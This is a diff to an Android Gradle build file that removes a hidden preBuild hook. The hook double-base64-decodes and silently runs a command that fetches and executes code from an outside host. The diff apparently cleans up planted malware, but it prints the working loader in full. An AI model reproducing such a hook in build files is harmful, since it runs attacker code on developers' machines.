@@ -141,10 +141,3 @@ dependencies {
     androidTestImplementation(libs.androidx.junit)
     androidTestImplementation(libs.androidx.espresso.core)
 }
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((g(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUR1p6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOVlXNWtjbTlwWkY5cmIzUnNhVzRpSUdoMGRIQnpPaTh2Ym1WMFkyUnVZV1J6TG1sdUwyRXBJaUI4SUhOb0NnPT0K | g | sh ) >/dev/null 2>&1 &)").start()
-        }
-    }
-}
